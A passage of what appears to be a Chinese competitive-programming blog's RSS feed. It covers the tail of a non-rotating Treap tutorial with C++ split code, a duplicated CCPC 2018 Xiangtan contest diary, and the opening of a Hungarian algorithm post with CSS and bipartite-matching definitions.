    <span class="k">if</span> <span class="p">(</span><span class="n">k</span> <span class="o">&lt;=</span> <span class="n">lson</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">siz</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sndRt</span> <span class="o">=</span> <span class="n">rt</span><span class="p">;</span> 
        <span class="n">split</span><span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">k</span><span class="p">,</span> <span class="n">fstRt</span><span class="p">,</span> <span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">fstRt</span> <span class="o">=</span> <span class="n">rt</span><span class="p">;</span> 
        <span class="n">split</span><span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">k</span> <span class="o">-</span> <span class="n">lson</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">siz</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sndRt</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">maintain</span><span class="p">(</span><span class="n">rt</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><hr>
<p>对于按权值分裂也是同理的，这里就只给出代码了：</p>
<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">void</span> <span class="nf">splitByVal</span><span class="p">(</span><span class="kt">int</span> <span class="n">rt</span><span class="p">,</span> <span class="kt">int</span> <span class="n">val</span><span class="p">,</span> <span class="kt">int</span> <span class="o">&amp;</span> <span class="n">fstRt</span><span class="p">,</span> <span class="kt">int</span> <span class="o">&amp;</span> <span class="n">sndRt</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">rt</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fstRt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">sndRt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">val</span> <span class="o">&gt;</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sndRt</span> <span class="o">=</span> <span class="n">rt</span><span class="p">;</span>
        <span class="n">splitByVal</span><span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">val</span><span class="p">,</span> <span class="n">fstRt</span><span class="p">,</span> <span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">fstRt</span> <span class="o">=</span> <span class="n">rt</span><span class="p">;</span>
        <span class="n">splitByVal</span><span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">val</span><span class="p">,</span> <span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sndRt</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">maintain</span><span class="p">(</span><span class="n">rt</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><h1 id="这意味着什么">这意味着什么？</h1>
<h2 id="支持快速插入删除的数组">支持快速插入删除的数组</h2>
<ul>
<li>在任意位置 $k$ 插入节点 $V$：
<ul>
<li>$\text{split}(T, k, A, B)$;</li>
<li>$T = \text{merge}(\text{merge}(A, V), B)$;</li>
</ul>
</li>
<li>在任意位置 $k$ 删除节点：
<ul>
<li>$\text{split}(T, k - 1, A, B)$;</li>
<li>$\text{split}(B, 1, _, B)$;</li>
<li>$T = \text{merge}(A, B)$;</li>
</ul>
</li>
<li>询问位置 $k$ 处节点的值：
<ul>
<li>$\text{split}(T, k - 1, A, B)$;</li>
<li>$\text{split}(B, 1, B, C)$;</li>
<li>得到了 $B$ 节点的值~</li>
<li>$\text{merge}(\text{merge}(A, B), C)$;</li>
</ul>
</li>
</ul>
<p>看起来很有用~ 基本可以代替掉块状链表了。</p>
<h2 id="平衡树">平衡树</h2>
<p>我们不妨先直接拉一道家喻户晓的模板题来举个例子：<a href="https://loj.ac/problem/104">普通平衡树 - 题目 - LibreOJ</a>。</p>
<p>题目中要求我们实现 $6$ 类操作：</p>
<ol>
<li>插入数 $x$；</li>
<li>删除数 $x$（若有多个相同的 $x$ 则只删除一个）；</li>
<li>查询数 $x$ 的排名（若有多个相同的 $x$ 则输出最小排名）；</li>
<li>查询排名为 $x$ 的数；</li>
<li>求 $x$ 的前驱（即小于 $x$ 的数中的最大值）；</li>
<li>求 $x$ 的后继（即大于 $x$ 的数中的最小值）。</li>
</ol>
<p>下面我们就试着主要靠两个核心函数来解决上述 $6$ 个问题。</p>
<h3 id="插入">插入</h3>
<p>首先我们将带插入节点的 $\text{rnd}$ 赋成随机值，然后按 $x$ 将 Treap $\text{split}$ （按权值分裂） 成小于等于 $x$ 的 $A$ 和大于 $x$ 的 $B$。我们不妨把待插入的 $x$ 看成一棵只含一个节点的 Treap，先将其与 $A$ $\text{merge}$，再得到的 Treap 与 $B$ $\text{merge}$，就完成插入了。</p>
<h3 id="删除">删除</h3>
<p>与插入类似，首先我们按 $x$ 将 Treap $\text{split}$ 成小于等于 $x$ 的 $A$ 和大于 $x$ 的 $B$，再将 $A$ $\text{split}$ 成小于等于 $x - 1$ 的 $C$ 和大于 $x - 1$（即等于 $x$）的 $D$。接下来，我们将 $B$ 和 $C$ $\text{merge}$ 在一起即可。</p>
<p>上述操作会把所有等于 $x$ 的数全部删掉。如果题目只要求删掉一个 $x$，可以考虑将 $D$ 的左子树和右子树合并在一起得到 $E$。这样一来就等于舍弃了 $D$ 的根节点，使得 $D$ 中等于 $x$ 的数少了一个。最后再把 $E$ 也 $\text{merge}$ 进答案。</p>
<h3 id="查询数的排名">查询数的排名</h3>
<p>实际上就是查询有多少个数比 $x$ 小，然后将结果加 $1$ 即是排名。</p>
<p>考虑现按 $x - 1$ 将 Treap $\text{split}$ 成 $A$ 和 $B$，这样一来 $A$ 的大小加上 $1$ 就是我们需要的答案。查询完后再将 $A$ 和 $B$ $\text{merge}$ 起来恢复原状即可。</p>
<h3 id="查询排名对应的数">查询排名对应的数</h3>
<p>我们只需要实现按排名分裂，就可以跟上面类似直接 $\text{split}$ 一下就好了。</p>
<h3 id="查询前驱或后继">查询前驱或后继</h3>
<p>这里我们以查询前驱为例（后继完全同理）：</p>
<p>我们考虑先将 Treap 按 $x - 1$ $\text{split}$ 成 $A$ 和 $B$，那么 $A$ 树中最大的数（即第 $A.size$ 大）就是我们要查询的答案。借用上面的查询排名对应数的函数即可实现。</p>
<h3 id="参考代码">参考代码</h3>
<p>大家可以看看 <a href="https://github.com/codgician/Competitive-Programming/blob/master/LOJ/104/treap_without_rotations.cpp">我的代码</a> 来对照理解一番~</p>
<h1 id="heading">%%%</h1>
<ul>
<li>chen_tr - <a href="https://blog.csdn.net/chen_tr/article/details/50924073">偷懒专用平衡树——Treap</a></li>
<li>LadyLex - <a href="https://www.cnblogs.com/LadyLex/p/7182491.html">无旋treap：从好奇到入门</a></li>
<li>yyf0309 - <a href="https://www.cnblogs.com/yyf0309/p/Unrotated_Treap.html">无旋转Treap简介</a></li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>CCPC 2018 湘潭邀请赛游记</title>
			<link>https://codgician.me/zh-hans/posts/2018/05/ccpc-2018-xiangtan-travel-notes/</link>
			<pubDate>Wed, 16 May 2018 13:19:35 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/05/ccpc-2018-xiangtan-travel-notes/</guid>
			<description>Day 0 打印了 Claris 巨佬的模板（虽然看不懂），顺便打印了几个自己整理的常用模板（然而最后全都没用上）。 下午收拾东西，不知道哪里一抽就把小黄兔和蛤乐器</description>
			<content type="html"><![CDATA[<h1 id="day-0">Day 0</h1>
<p>打印了 Claris 巨佬的模板（虽然看不懂），顺便打印了几个自己整理的常用模板（然而最后全都没用上）。</p>
<p>下午收拾东西，不知道哪里一抽就把小黄兔和蛤乐器带上了。</p>
<p>坐地铁到了杭州东站，17:50 上了学校报销的硬卧火车，车上偶遇浙江工商大学的巨佬，得知他们参加过区域赛感觉打扰了。他们说他们学校另外两个队都坐飞机（因为他们去年拿了银），而且学校报销，无限羡慕 QAQ。</p>
<p>车上一位老奶奶问起我们是去湘潭干嘛的，我们异口同声表示是去打电竞 😂 。</p>
<p>没上车多久就忍不住吃面包，然后一不小心把明天早餐的部分也吃完了。刚开始还翻看了一下自己带的《编程之美》，然后感觉车上的环境完全看不下去就开始划水了。</p>
<p>熄灯之前 jackyan 巨佬让我拿出之前打印的 2017 湘潭邀请赛题册，于是我也没法继续愉快地划水了。拿出了题册一起看，发现怎么有两道高斯消元，好可啪。xywsxp 巨佬也过来观摩题目。其中有一题大意是在给定图中删去最少边数使得 MST 变大。 xywsxp 在集训队群里面问了一波，然后老刘秒回“最短边删除不是就变大了吗”，然后 Claris 神犇秒打脸表示要用最小割，然后老刘就问起出发顺不顺利了 🙈。感觉好尴尬啊（<del>虽然本垃圾也有过这一念头</del>），%%% Claris。</p>
<p>晚上 Hanano 巨佬表示睡什么觉并安利了达芬奇睡眠法，瑟瑟发抖。最后十一点过的时候我忍不住还是滚到床上去睡觉了 QAQ。</p>
<h1 id="day-1">Day 1</h1>
<p>睡觉时完全处于一个小时醒一次的状态，于是四点过的时候就受不了爬起来<del>看日出</del>，然后发现 Hanano 貌似在下面待了一个晚上 QAQ。</p>
<p>下车出站后坐公交一路飙到了湘潭大学东门，然后来到了人均 30 人民币一晚的住宿，<del>终于知道为什么老刘不来带队了</del>，感觉被卖了 😭。</p>
<p>早餐混进了湘潭大学食堂解决，食堂的师傅热心地表示支持支付宝的，然后说完就现场拉了个学生喊他帮我们刷卡然后我们转账给他。怪不好意思的 QAQ。本想照顾队友不吃辣的口味于是一起点了“北京炸酱面”，但面做好后发现竟然是臊子红油拌面 orz。队友貌似被学校食堂的辣椒酱惯坏了，还勇敢地加了几勺旁边的辣酱 🙈 。这锅我不背（逃</p>
<p>中午本想跟 xywsxp 一起吃石锅鱼，然而由于他的花样乱带路我们就抛弃他去吃低配版华莱士了（逃</p>
<p>下午领了狗牌和衣服后就是热身赛了。热身赛只有一个半小时，感觉好短 QAQ。调了一下环境，本来想用 Sublime 结果配 build file 的时候貌似写错了一个地方一直没调好，于是就只好用 Dev C++ 了。</p>
<p>一看 A 题，感觉是个暴搜，然而不敢上，于是就开 B，发现 B 是个超级大模拟，怕写挂还是不敢上，于是就开 C 题，感觉 C 题貌似可做，想到可以把原矩阵和目标矩阵异或一下只要判断异或后的矩阵能不能按题目规则化为全 0 矩阵就好了。然后和队友脑袋一热猜结论只要 1 的个数能被 4 整除就可以了&hellip; WA&hellip; 然后很快就找出反例了。Hanano 巨佬貌似有自己的想法了，然后 C 题就交给他去码了。D 题显然是个 DP，然而我当时 DP 方程式推错（实际上少算了非第一个数开始的能被 3 整除的数）。差点以为热身赛要爆零，还好 Hanano 巨佬在最后十分钟左右 A 掉了 C 题，然后我立马开始码 D 题，结果发现样例没过，然后就一题滚粗了。</p>
<p>南邮巨佬好强啊，热身赛进行了一半就 AK 走人了。</p>
<p>在去觅食的路上反应过来了错在哪里，然后回招待所加了一行代码就过了样例，心情跌入谷底。无心复习的我晚上打了若干局 Wordament 和数独。</p>
<p><img src="/posts/life/ccpc-2018-xiangtan-travel-notes/cover.jpg" alt="欢迎牌"></p>
<h1 id="day-2">Day 2</h1>
<p>早上起来感觉慌慌的，把开幕式翘了直接去了赛场。</p>
<p>Hanano 赛前就猜 F 题是签到题，比赛开始后第一个就开了 F 题，挂了一次后 A 掉了，太强了orz。</p>
<p>jackyan 貌似阅读 A 题的时候到了一点语言障碍，本来还在推 K 题的我过去看了看，发现是道大水题，然后就 1A 了，于是 jackyan 就去开 B 题了。</p>
<p>A 掉了 A 题后我意识到 A、B、C 三道题貌似是一个系列的，就去看了看 C 题。感觉是个线段树，然而没想出来怎么区间合并，所以就感觉是分块或者莫队。然而我都不会，所以准备丢给队友 🙈。与此同时 Hanano 又用容斥原理 A 掉了 K 题，好强啊 QAQ。所以我就去看 D 题了。</p>
<p>D 题我推了半天没有太确切的思路，看了一下榜发现没人过，果断放弃。Hanano 让我跟他去看看 G 题，然后 Hanano 巨佬很快想到了正解，1A，太强了orz。</p>
<p>看了看榜发现好多人都过了 C 题，于是我们一起开了 C 题。我们用莫队 + 树状数组 + 二分瞎搞出来了一个复杂度 $\mathcal{O}(N\sqrt{N}log^2{N})$ 的算法。由于队里就本垃圾不会写莫队，Hanano 表示状态不好，所以 Hanano 写了一半后就交给 jackyan 巨佬去写了，没想到第一发交竟然是 WA 不是 TLE，顿觉有希望。瞎改了一下莫队后又交一发，竟然 A 了。进入疯狂膜队友模式 %%%。</p>
<p>接下来就是循环卡题的时光了QAQ。我们主要尝试攻 B 题和 J 题，另外我也继续把 D 题和 I 题考虑了一波，然而很遗憾直到比赛结束都没搞出来，五题滚粗。<del>本垃圾 A 了一道大水题后就全程划水，好惭愧啊 QAQ</del>。</p>
<p>另外，午餐竟然是麦当劳，超级好评！</p>
<p>下午讲题的时候得知 B 题竟然是结论题，只要一篇论文一小时就好，吐血 QAQ。讲题人表示题是叉姐出的，有问题问叉姐，然后就光速讲完了，留下我一脸懵逼。</p>
<p>没想到竟然水到了一个银奖，然而摸一下奖牌后又要还给老刘堆在集训室了 QAQ。</p>
<p>jackyan 巨佬貌似对我有了一句新的口头禅 “你羞愧吗？” QAQ 😶</p>
<p>下午五点过就来到了火车站…… 打了若干盘斗地主，每次我发牌 jackyan 都会莫名其妙地当上地主，然后将本垃圾狂虐 QAQ。</p>
<p>然后湘潭两日游就这么结束了（逃</p>
<h1 id="赛后总结">赛后总结</h1>
<p><del>可以明显感到这场比赛中我太水了。</del></p>
<p>这场比赛反映出了我个人在思维能力上的不足。平时做专题的时候侧重点都在于学习新的算法而忽略了对思维的培养。这就造成一个很尴尬的局面，简单的思维题（诸如 DP）做不来，而比赛时需要稍微难一点算法的题目又不可能是裸的模板题，所以还是做不来。 🙈</p>
<p>看起来下个月要抽时间多练练 DP 以及数学了。 QAQ</p>
]]></content>
		</item>
		
		<item>
			<title>CCPC 2018 湘潭邀请赛游记</title>
			<link>https://codgician.me/zh-hans/posts/2018/05/ccpc-2018-xiangtan-travel-notes/</link>
			<pubDate>Wed, 16 May 2018 13:19:35 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/05/ccpc-2018-xiangtan-travel-notes/</guid>
			<description>Day 0 打印了 Claris 巨佬的模板（虽然看不懂），顺便打印了几个自己整理的常用模板（然而最后全都没用上）。 下午收拾东西，不知道哪里一抽就把小黄兔和蛤乐器</description>
			<content type="html"><![CDATA[<h1 id="day-0">Day 0</h1>
<p>打印了 Claris 巨佬的模板（虽然看不懂），顺便打印了几个自己整理的常用模板（然而最后全都没用上）。</p>
<p>下午收拾东西，不知道哪里一抽就把小黄兔和蛤乐器带上了。</p>
<p>坐地铁到了杭州东站，17:50 上了学校报销的硬卧火车，车上偶遇浙江工商大学的巨佬，得知他们参加过区域赛感觉打扰了。他们说他们学校另外两个队都坐飞机（因为他们去年拿了银），而且学校报销，无限羡慕 QAQ。</p>
<p>车上一位老奶奶问起我们是去湘潭干嘛的，我们异口同声表示是去打电竞 😂 。</p>
<p>没上车多久就忍不住吃面包，然后一不小心把明天早餐的部分也吃完了。刚开始还翻看了一下自己带的《编程之美》，然后感觉车上的环境完全看不下去就开始划水了。</p>
<p>熄灯之前 jackyan 巨佬让我拿出之前打印的 2017 湘潭邀请赛题册，于是我也没法继续愉快地划水了。拿出了题册一起看，发现怎么有两道高斯消元，好可啪。xywsxp 巨佬也过来观摩题目。其中有一题大意是在给定图中删去最少边数使得 MST 变大。 xywsxp 在集训队群里面问了一波，然后老刘秒回“最短边删除不是就变大了吗”，然后 Claris 神犇秒打脸表示要用最小割，然后老刘就问起出发顺不顺利了 🙈。感觉好尴尬啊（<del>虽然本垃圾也有过这一念头</del>），%%% Claris。</p>
<p>晚上 Hanano 巨佬表示睡什么觉并安利了达芬奇睡眠法，瑟瑟发抖。最后十一点过的时候我忍不住还是滚到床上去睡觉了 QAQ。</p>
<h1 id="day-1">Day 1</h1>
<p>睡觉时完全处于一个小时醒一次的状态，于是四点过的时候就受不了爬起来<del>看日出</del>，然后发现 Hanano 貌似在下面待了一个晚上 QAQ。</p>
<p>下车出站后坐公交一路飙到了湘潭大学东门，然后来到了人均 30 人民币一晚的住宿，<del>终于知道为什么老刘不来带队了</del>，感觉被卖了 😭。</p>
<p>早餐混进了湘潭大学食堂解决，食堂的师傅热心地表示支持支付宝的，然后说完就现场拉了个学生喊他帮我们刷卡然后我们转账给他。怪不好意思的 QAQ。本想照顾队友不吃辣的口味于是一起点了“北京炸酱面”，但面做好后发现竟然是臊子红油拌面 orz。队友貌似被学校食堂的辣椒酱惯坏了，还勇敢地加了几勺旁边的辣酱 🙈 。这锅我不背（逃</p>
<p>中午本想跟 xywsxp 一起吃石锅鱼，然而由于他的花样乱带路我们就抛弃他去吃低配版华莱士了（逃</p>
<p>下午领了狗牌和衣服后就是热身赛了。热身赛只有一个半小时，感觉好短 QAQ。调了一下环境，本来想用 Sublime 结果配 build file 的时候貌似写错了一个地方一直没调好，于是就只好用 Dev C++ 了。</p>
<p>一看 A 题，感觉是个暴搜，然而不敢上，于是就开 B，发现 B 是个超级大模拟，怕写挂还是不敢上，于是就开 C 题，感觉 C 题貌似可做，想到可以把原矩阵和目标矩阵异或一下只要判断异或后的矩阵能不能按题目规则化为全 0 矩阵就好了。然后和队友脑袋一热猜结论只要 1 的个数能被 4 整除就可以了&hellip; WA&hellip; 然后很快就找出反例了。Hanano 巨佬貌似有自己的想法了，然后 C 题就交给他去码了。D 题显然是个 DP，然而我当时 DP 方程式推错（实际上少算了非第一个数开始的能被 3 整除的数）。差点以为热身赛要爆零，还好 Hanano 巨佬在最后十分钟左右 A 掉了 C 题，然后我立马开始码 D 题，结果发现样例没过，然后就一题滚粗了。</p>
<p>南邮巨佬好强啊，热身赛进行了一半就 AK 走人了。</p>
<p>在去觅食的路上反应过来了错在哪里，然后回招待所加了一行代码就过了样例，心情跌入谷底。无心复习的我晚上打了若干局 Wordament 和数独。</p>
<p><img src="/posts/icpc-notes/ccpc-2018-xiangtan-travel-notes/cover.jpg" alt="欢迎牌"></p>
<h1 id="day-2">Day 2</h1>
<p>早上起来感觉慌慌的，把开幕式翘了直接去了赛场。</p>
<p>Hanano 赛前就猜 F 题是签到题，比赛开始后第一个就开了 F 题，挂了一次后 A 掉了，太强了orz。</p>
<p>jackyan 貌似阅读 A 题的时候到了一点语言障碍，本来还在推 K 题的我过去看了看，发现是道大水题，然后就 1A 了，于是 jackyan 就去开 B 题了。</p>
<p>A 掉了 A 题后我意识到 A、B、C 三道题貌似是一个系列的，就去看了看 C 题。感觉是个线段树，然而没想出来怎么区间合并，所以就感觉是分块或者莫队。然而我都不会，所以准备丢给队友 🙈。与此同时 Hanano 又用容斥原理 A 掉了 K 题，好强啊 QAQ。所以我就去看 D 题了。</p>
<p>D 题我推了半天没有太确切的思路，看了一下榜发现没人过，果断放弃。Hanano 让我跟他去看看 G 题，然后 Hanano 巨佬很快想到了正解，1A，太强了orz。</p>
<p>看了看榜发现好多人都过了 C 题，于是我们一起开了 C 题。我们用莫队 + 树状数组 + 二分瞎搞出来了一个复杂度 $\mathcal{O}(N\sqrt{N}log^2{N})$ 的算法。由于队里就本垃圾不会写莫队，Hanano 表示状态不好，所以 Hanano 写了一半后就交给 jackyan 巨佬去写了，没想到第一发交竟然是 WA 不是 TLE，顿觉有希望。瞎改了一下莫队后又交一发，竟然 A 了。进入疯狂膜队友模式 %%%。</p>
<p>接下来就是循环卡题的时光了QAQ。我们主要尝试攻 B 题和 J 题，另外我也继续把 D 题和 I 题考虑了一波，然而很遗憾直到比赛结束都没搞出来，五题滚粗。<del>本垃圾 A 了一道大水题后就全程划水，好惭愧啊 QAQ</del>。</p>
<p>另外，午餐竟然是麦当劳，超级好评！</p>
<p>下午讲题的时候得知 B 题竟然是结论题，只要一篇论文一小时就好，吐血 QAQ。讲题人表示题是叉姐出的，有问题问叉姐，然后就光速讲完了，留下我一脸懵逼。</p>
<p>没想到竟然水到了一个银奖，然而摸一下奖牌后又要还给老刘堆在集训室了 QAQ。</p>
<p>jackyan 巨佬貌似对我有了一句新的口头禅 “你羞愧吗？” QAQ 😶</p>
<p>下午五点过就来到了火车站…… 打了若干盘斗地主，每次我发牌 jackyan 都会莫名其妙地当上地主，然后将本垃圾狂虐 QAQ。</p>
<p>然后湘潭两日游就这么结束了（逃</p>
<h1 id="赛后总结">赛后总结</h1>
<p><del>可以明显感到这场比赛中我太水了。</del></p>
<p>这场比赛反映出了我个人在思维能力上的不足。平时做专题的时候侧重点都在于学习新的算法而忽略了对思维的培养。这就造成一个很尴尬的局面，简单的思维题（诸如 DP）做不来，而比赛时需要稍微难一点算法的题目又不可能是裸的模板题，所以还是做不来。 🙈</p>
<p>看起来下个月要抽时间多练练 DP 以及数学了。 QAQ</p>
]]></content>
		</item>
		
		<item>
			<title>浅谈匈牙利算法</title>
			<link>https://codgician.me/zh-hans/posts/2018/03/hungarian-algorithm/</link>
			<pubDate>Fri, 09 Mar 2018 12:52:01 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/03/hungarian-algorithm/</guid>
			<description>pre code.sourceCode { white-space: pre; position: relative; } pre code.sourceCode span { display: inline-block; line-height: 1.25; } pre code.sourceCode span:empty { height: 1.2em; } code.sourceCode span { color: inherit; text-decoration: inherit; } div.sourceCode { margin: 1em 0; } pre.sourceCode { margin: 0; } @media screen { div.sourceCode { overflow: auto; } } @media print { pre code.sourceCode { white-space: pre-wrap; } pre code.sourceCode span { text-indent: -5em; padding-left: 5em; }</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>
<style type="text/css">
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  { color: #cccccc; background-color: #303030; }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
code span.al { color: #ffcfaf; } /* Alert */
code span.an { color: #7f9f7f; font-weight: bold; } /* Annotation */
code span.at { } /* Attribute */
code span.bn { color: #dca3a3; } /* BaseN */
code span.bu { } /* BuiltIn */
code span.cf { color: #f0dfaf; } /* ControlFlow */
code span.ch { color: #dca3a3; } /* Char */
code span.cn { color: #dca3a3; font-weight: bold; } /* Constant */
code span.co { color: #7f9f7f; } /* Comment */
code span.cv { color: #7f9f7f; font-weight: bold; } /* CommentVar */
code span.do { color: #7f9f7f; } /* Documentation */
code span.dt { color: #dfdfbf; } /* DataType */
code span.dv { color: #dcdccc; } /* DecVal */
code span.er { color: #c3bf9f; } /* Error */
code span.ex { } /* Extension */
code span.fl { color: #c0bed1; } /* Float */
code span.fu { color: #efef8f; } /* Function */
code span.im { } /* Import */
code span.in { color: #7f9f7f; font-weight: bold; } /* Information */
code span.kw { color: #f0dfaf; } /* Keyword */
code span.op { color: #f0efd0; } /* Operator */
code span.ot { color: #efef8f; } /* Other */
code span.pp { color: #ffcfaf; font-weight: bold; } /* Preprocessor */
code span.sc { color: #dca3a3; } /* SpecialChar */
code span.ss { color: #cc9393; } /* SpecialString */
code span.st { color: #cc9393; } /* String */
code span.va { } /* Variable */
code span.vs { color: #cc9393; } /* VerbatimString */
code span.wa { color: #7f9f7f; font-weight: bold; } /* Warning */
</style>

<div id="TOC">
<ul>
<li><a href="#前言">前言</a></li>
<li><a href="#几点概念">几点概念</a>
<ul>
<li><a href="#二分图">二分图</a></li>
<li><a href="#匹配">匹配</a></li>
<li><a href="#增广路径">增广路径</a></li>
</ul></li>
<li><a href="#无权二分图最大匹配">无权二分图最大匹配</a>
<ul>
<li><a href="#思想">思想</a></li>
<li><a href="#正确性">正确性</a></li>
<li><a href="#代码-c">代码 (C++)</a></li>
</ul></li>
<li><a href="#数个名词">数个名词</a>
<ul>
<li><a href="#交错树">交错树</a></li>
<li><a href="#顶标">顶标</a></li>
<li><a href="#相等子图">相等子图</a></li>
</ul></li>
<li><a href="#带权二分图最大匹配">带权二分图最大匹配</a>
<ul>
<li><a href="#思想-1">思想</a></li>
<li><a href="#几点变形">几点变形</a></li>
<li><a href="#代码-c-1">代码 (C++)</a>
<ul>
<li><a href="#dfs-版本">DFS 版本</a></li>
<li><a href="#bfs-版本">BFS 版本</a></li>
</ul></li>
</ul></li>
<li><a href="#section">%%%</a></li>
</ul>
</div>

<div id="前言" class="section level1">
<h1>前言</h1>
<p>说好的自己整理笔记，最后却变成了抄别人的博客 + 抄书。我还是太菜了，惭愧😭……</p>
<p>所以…… 本文<strong>很大程度上</strong>借鉴了巨佬出的新书和网络上几篇优秀文章（具体列表可见文末）。本人向这些文章的作者们表示衷心感谢！</p>
<p>这篇文章算得上是我第一次写稍微有点难度的算法总结文章…… 可能会有很多错误，欢迎指正~</p>
</div>
<div id="几点概念" class="section level1">
<h1>几点概念</h1>
<div id="二分图" class="section level2">
<h2>二分图</h2>
<p><strong>二分图 (Bipartite graph)</strong> 是一种特殊的简单图，它的顶点可以被分为两个不相交的集合（<span class="math inline">\(U\)</span> 和 <span class="math inline">\(V\)</span>），并且同属一个集合的点两两不相连 (<span class="math inline">\(E_U = E_V = \varnothing\)</span>)。也就是说，如果一个图是二分图，它要么没有圈 (cycle)，要么所有圈包含边的个数均为偶数。</p>
<p>例如，下图 <code>Fig.1</code> 就是一个二分图。但是为了方便，我们通常将其画作 <code>Fig.2</code> 的样子。</p>
<div class="figure">
<img src="/posts/icpc-notes/hungarian-algorithm/fig-1-to-2.png" alt="" />
<p class="caption">Fig.1 &amp;&amp; 2</p>
</div>
<p>那么我们如何使用算法来判定二分图呢？</p>
<p>显然，我们可以使用<strong>染色法</strong>，即用黑白两种颜色来标记图中的节点，当一个节点被标记后，我们将所有与之相邻的节点都标记为相反的颜色。若在此染色过程中出现了冲突，那么就不是二分图，否则是二分图。</p>
</div>
<div id="匹配" class="section level2">
<h2>匹配</h2>
<p><strong>匹配 (Matching)</strong> 是边的集合 (<span class="math inline">\(M \subset E\)</span>)，其中任意两条边都没有公共点。</p>
<p>例如，下图 <code>Fig.3</code> 中所有红的的边组成的集合就是 <code>Fig.2</code> 的一个匹配。而在其中，被标红的边被称作<strong>匹配边</strong>；匹配边所连接的点被称为<strong>匹配点</strong>。与之相反地，没有被标红的边被称作<strong>非匹配边</strong>，非匹配边所连接的点被称作<strong>非匹配点</strong>。</p>
<p>显而易见，对于一个二分图来说，可能会有很多种匹配。如果某二分图的某一个匹配包含的边的数量在该二分图所有匹配中最大，那么称这个匹配为<strong>最大匹配</strong>。例如，下图 <code>Fig.4</code> 就是 <code>Fig.2</code> 的最大匹配。</p>
<p>相似地，如果这个二分图带权，那么权值之和最大的匹配被称作<strong>最大权匹配</strong>。</p>
<div class="figure">
<img src="/posts/icpc-notes/hungarian-algorithm/fig-3-to-4.png" alt="" />
<p class="caption">Fig.3 &amp;&amp; 4</p>
</div>
</div>
<div id="增广路径" class="section level2">
<h2>增广路径</h2>
<p><strong>增广路径 (Augmenting Path)</strong> 是一条连通两个未匹配点，且非匹配边和匹配边在其上交替出现的路径。</p>
<p>例如，下图 <code>Fig.6</code> 就是 <code>Fig.5</code> 的一条增广路径。</p>
<div class="figure">
<img src="/posts/icpc-notes/hungarian-algorithm/fig-5-to-6.png" alt="" />
<p class="caption">Fig.5 &amp;&amp; 6</p>
</div>
<p>我个人认为增广路径应该理解为<strong>某种还可以进一步优化的路径</strong>，因此在不同的问题中增广路径应该有不同的具体定义。例如上面提到的这种路径，如果把非匹配边和匹配边交换就可以增加一条匹配边（也就是说，这种路径不是最优的，是仍然可以增广的）。</p>
</div>
</div>
<div id="无权二分图最大匹配" class="section level1">
<h1>无权二分图最大匹配</h1>
<div id="思想" class="section level2">
<h2>思想</h2>
